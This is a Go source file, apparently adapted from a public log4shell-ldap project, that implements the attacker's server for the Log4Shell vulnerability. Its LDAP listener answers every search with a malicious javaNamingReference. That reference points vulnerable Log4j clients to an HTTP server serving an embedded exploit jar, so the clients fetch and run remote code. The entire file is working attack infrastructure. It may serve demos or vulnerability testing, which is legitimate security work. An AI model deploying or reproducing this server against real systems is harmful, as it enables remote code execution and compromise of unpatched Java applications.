// This file is based on https://github.com/jerrinot/log4shell-ldap

package main

import (
	"embed"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/lor00x/goldap/message"
	ldap "github.com/vjeantet/ldapserver"
)

//go:embed log4shell-exploit-1.0-SNAPSHOT.jar
var jar embed.FS

var publicHost string

const (
	exploitJar = "log4shell-exploit-1.0-SNAPSHOT.jar"
	javaClass  = "io.tetrate.log4shell.exploit.Log4shellExploit"
)

func main() {
	flag.StringVar(&publicHost, "publicIp", os.Getenv("publicIp"), "Usage:$ log4shell-ldap --publicIp 192.168.1.1")
	flag.Parse()

	ldapServer := startLdapServer()
	startHttpServer()

	fmt.Println("log4shell server started")

	ch := make(chan os.Signal, 2)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)
	ldapServer.Stop()
}

func startLdapServer() *ldap.Server {
	ldap.Logger = log.New(ioutil.Discard, "", log.LstdFlags)
	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Search(handleSearch)
	routes.Bind(handleBind)
	server.Handle(routes)
	go func() {
		err := server.ListenAndServe("0.0.0.0:1389")
		if err != nil {
			panic(err)
		}
	}()
	return server
}

func startHttpServer() {
	var staticFS = http.FS(jar)
	fs := http.FileServer(staticFS)
	http.Handle("/"+exploitJar, fs)
	go func() {
		err := http.ListenAndServe(":3000", nil)
		if err != nil {
			panic(err)
		}
	}()
}

func getOwnAddress(m *ldap.Message) string {
	if publicHost != "" {
		return publicHost
	}
	return strings.Split(m.Client.GetConn().LocalAddr().String(), ":")[0]
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()
	select {
	case <-m.Done:
		return
	default:
	}

	fmt.Printf("received request from %s\n", m.Client.GetConn().RemoteAddr())

	codebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/%s", getOwnAddress(m), exploitJar))
	e := ldap.NewSearchResultEntry("cn=pwned, " + string(r.BaseObject()))
	e.AddAttribute("cn", "pwned")
	e.AddAttribute("javaClassName", javaClass)
	e.AddAttribute("javaCodeBase", codebase)
	e.AddAttribute("objectclass", "javaNamingReference")
	e.AddAttribute("javaFactory", javaClass)

	fmt.Printf("delivering malicious LDAP payload: %v\n", e)

	w.Write(e)
	w.Write(ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess))
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	w.Write(ldap.NewBindResponse(ldap.LDAPResultSuccess))
}
